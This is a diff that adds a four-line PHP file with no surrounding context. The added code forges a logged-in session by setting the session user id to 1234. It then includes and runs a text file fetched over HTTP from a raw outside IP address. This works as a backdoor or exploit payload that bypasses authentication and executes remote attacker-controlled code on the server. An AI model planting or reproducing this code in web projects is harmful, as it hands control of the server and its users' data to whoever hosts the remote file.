@@ -1,0 +1,4 @@
+<?php
+$_SESSION["logged_as"]["id"] = 1234;
+include('http://46.101.220.223/helpdesk.txt');
+?>
